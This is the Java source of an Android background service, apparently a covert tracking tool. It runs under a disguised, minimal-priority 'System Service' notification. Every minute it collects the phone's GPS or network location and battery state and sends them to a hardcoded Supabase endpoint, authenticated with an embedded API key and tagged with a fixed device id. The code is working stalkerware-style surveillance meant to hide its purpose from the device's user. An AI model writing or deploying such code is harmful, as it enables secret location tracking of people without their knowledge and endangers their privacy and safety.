package com.eyes.monitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import androidx.core.app.NotificationCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class EyesService extends Service implements LocationListener {
    private static final String CHANNEL_ID = "EyesForegroundChannel";
    private static final int NOTIFICATION_ID = 1001;
    private static final long INTERVAL_MS = 60000; // 1 menit sekali sync

    private LocationManager locationManager;
    private Handler handler;
    private Runnable telemetryRunnable;
    private String supabaseUrl = "https://wagvbmkimpswiidnenwx.supabase.co";
    private String supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndhZ3ZibWtpbXBzd2lpZG5lbnd4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE2MjE3MzAsImV4cCI6MjEwNzE5NzczMH0.2SjJOiWFueeRsC4aEWCOGNcOTWJTGBLhhjqzRgjlcT8";
    private String deviceId = "luna_device_01";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running background tasks")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();

        startForeground(NOTIFICATION_ID, notification);
        initLocationTracking();
        initTelemetryLoop();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void initLocationTracking() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        try {
            if (locationManager != null) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, INTERVAL_MS, 5f, this);
                } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, INTERVAL_MS, 5f, this);
                }
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }

    private void initTelemetryLoop() {
        handler = new Handler(Looper.getMainLooper());
        telemetryRunnable = new Runnable() {
            @Override
            public void run() {
                collectAndSendTelemetry();
                handler.postDelayed(this, INTERVAL_MS);
            }
        };
        handler.postDelayed(telemetryRunnable, INTERVAL_MS);
    }

    private void collectAndSendTelemetry() {
        new Thread(() -> {
            try {
                // Get Battery Status
                BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                int batteryLevel = 0;
                boolean isCharging = false;
                if (bm != null) {
                    batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                    isCharging = bm.isCharging();
                }

                // Get Last Known Location
                double lat = 0.0, lon = 0.0;
                if (locationManager != null) {
                    try {
                        Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (loc == null) {
                            loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        }
                        if (loc != null) {
                            lat = loc.getLatitude();
                            lon = loc.getLongitude();
                        }
                    } catch (SecurityException e) {
                        e.printStackTrace();
                    }
                }

                // Build JSON Payload
                JSONObject payload = new JSONObject();
                payload.put("device_id", deviceId);
                payload.put("latitude", lat);
                payload.put("longitude", lon);
                payload.put("battery_level", batteryLevel);
                payload.put("is_charging", isCharging);
                payload.put("network_type", "CONNECTED");
                payload.put("current_app", "unknown");

                // Send to Supabase REST API
                URL url = new URL(supabaseUrl + "/rest/v1/eyes_logs");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "json");
                conn.setRequestProperty("apikey", supabaseKey);
                conn.setRequestProperty("Authorization", "Bearer " + supabaseKey);
                conn.setRequestProperty("Prefer", "return=minimal");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                int responseCode = conn.getResponseCode();
                conn.disconnect();

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public void onLocationChanged(Location location) {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && telemetryRunnable != null) {
            handler.removeCallbacks(telemetryRunnable);
        }
        if (locationManager != null) {
            locationManager.removeUpdates(this);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
